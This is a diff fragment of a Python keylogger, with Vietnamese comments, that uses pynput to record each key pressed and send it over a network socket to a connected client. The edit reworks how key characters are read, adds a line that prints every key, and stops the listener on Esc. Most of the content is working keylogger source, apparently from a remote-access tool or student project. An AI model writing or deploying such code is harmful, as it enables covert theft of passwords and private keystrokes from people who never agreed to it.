@@ -4,10 +4,19 @@ from pynput import keyboard
 def start_keylogger(client_socket):
        
     def on_press(key):
-        try:
-            key_str = f'{key.char}'  # Lấy ký tự từ phím nhấn
-        except AttributeError:
-            key_str = f' {str(key)} '  # Xử lý các phím đặc biệt như Shift, Ctrl, ...
+        if hasattr(key,'char') and key.char is not None:
+            key_str = key.char # Lấy ký tự từ phím nhấn
+        else :
+            key_str = f' {str(key)}'
+
+        #in ra các phím nhấn
+        print(f'Key pressed:{key_str}')
+
+
+        #try:
+            #key_str = f'{key.char}'   #Lấy ký tự từ phím nhấn
+        #except AttributeError:
+            #key_str = f' {str(key)} '  # Xử lý các phím đặc biệt như Shift, Ctrl, ...
 
         # Gửi dữ liệu phím nhấn qua client_socket
         try:
@@ -20,7 +29,7 @@ def start_keylogger(client_socket):
         # Dừng keylogger khi nhấn phím Esc
         if key == keyboard.Key.esc:
             print("Stopping keylogger...")
-            # client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))
+            #client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))
             return False      
 
     # Bắt đầu lắng nghe sự kiện phím nhấn và thả
